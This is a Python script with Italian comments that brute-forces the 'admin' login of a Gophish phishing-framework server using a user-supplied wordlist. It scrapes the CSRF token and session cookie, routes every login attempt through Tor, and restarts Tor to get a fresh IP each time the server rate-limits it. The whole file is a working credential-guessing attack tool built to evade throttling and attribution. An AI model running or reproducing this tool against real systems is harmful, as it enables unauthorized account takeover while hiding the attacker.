import requests
import os, time
from bs4 import BeautifulSoup

'''
funzionamento del codice:
- ti chiede il dominio del sito gophish (www.example.com) - acquisisce in automatico Cookie e Token ( Tor proxies per il Token e per l'invio delle password )
- ti chidede la Wordlist Path
- testa in automatico le password dell'utente admin ricavando cookie, token ogni volta che come risposta del server sia "Too Many Requests" cambiando anche indrizzo IP Tor

requisiti per far funzionare il codice:
- Linux
- apt install tor
- pip install requests os time bs4

'''

proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

def main():
    header = {
        "Host": "",
        "Cookie": "",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "140",
        "Origin": "",
        "Referer": "",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
        "Te": "trailers"
    }
    payload = {
        "username" : "admin",
        "password" : "kali-phish",
        "csrf_token" : ""
    }

    header["Host"] = input("[+] Inserisci il dominio del sito gophish (www.example.com): ")
    header["Origin"] = f"https://{header['Host']}" # Qui puoi modificare HTTPS con HTTP
    header["Referer"] = f"{header['Origin']}/login?next=%2F"

    def acquisizione_Cookie_CSRFToken():
        #global header, payload
        # Creando sessione per ricavare nuovo CSRF Token e Cookie   | Tor proxies per il Token ;)
        session = requests.Session()
        response = session.get(header["Origin"], proxies=proxies)
        # Ricavando Cookie
        cookies_dict = session.cookies.get_dict()
        cookie_header = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
        header["Cookie"] = cookie_header # Salvandolo nel HEADER
        print("\n[+] Cookie ricavato: ", header["Cookie"])
        # Ricavando CSRF Token
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = str(soup.find("input", {"name": "csrf_token"})["value"])
        session.cookies.set('csrf_token', csrf_token)
        payload["csrf_token"] = csrf_token # Salvandolo nel PAYLOAD
        print("\n[+] CSRF Token ricavato con Tor: " + payload["csrf_token"] + "\n")
    acquisizione_Cookie_CSRFToken()
    
    # Imposta la wordlist path
    wordlist_path = ''
    while True:
        wordlist_path = input("[+] Inserisci path wordlist: ")
        try:
            with open(wordlist_path, 'r', encoding='utf-8') as f:
                break
        except:
            print("[-] Errore Path")

    # Invio delle password
    i = 0
    with open(wordlist_path, 'r', encoding='utf-8') as f:
        for riga in f:
            while True:
                try:
                    print(f"[{i}] Inviando password: ", payload["password"])
                    r = requests.post(url=header['Referer'], proxies=proxies, headers=header, data=payload, timeout=10)

                    print("[&] Status Code: ", str(r.status_code))
                    if r.status_code == 302:
                        print(f"[+++] Credenziali Trovate!\n[$] {payload}")
                        return payload
                    elif "Forbidden - CSRF token invalid" in str(r.text):
                        print("[!] Errore con il CSRF token...")
                        print("[!] Sistemare CSRF token...")
                        return None
                    
                    if "Too Many Requests" in str(r.text[:500]):
                        print("\n", str(r.text[:500]))
                        acquisizione_Cookie_CSRFToken()
                        new_identity()
                    else:
                        break
                except:
                    print("\n[-] Errore nell'invio della password!")
                    new_identity()
        
            i += 1
            password = str(riga.strip())
            payload["password"] = password
    
    print("[---] Password non trovata...! Dio merda")
    return None

def get_public_ip():
    try:
        response = requests.get("https://checkip.amazonaws.com", proxies=proxies, timeout=5)
        return response.text.strip()
    except requests.RequestException:
        return "Errore nel recupero dell'IP"

def new_identity():
    print("\nRiavvio di Tor in corso... aspetta 3 secondi")
    os.system("sudo systemctl restart tor")

    time.sleep(3)  # Attendi qualche secondo per la riconnessione
    new_ip = get_public_ip()
    print(f"[+] - Tor è stato riavviato! Nuovo IP: {new_ip}\n")
    return new_ip


if "__main__" == main():
    try:
        main()
    except KeyboardInterrupt:
        print("[:] Programma interrotto manualmente!")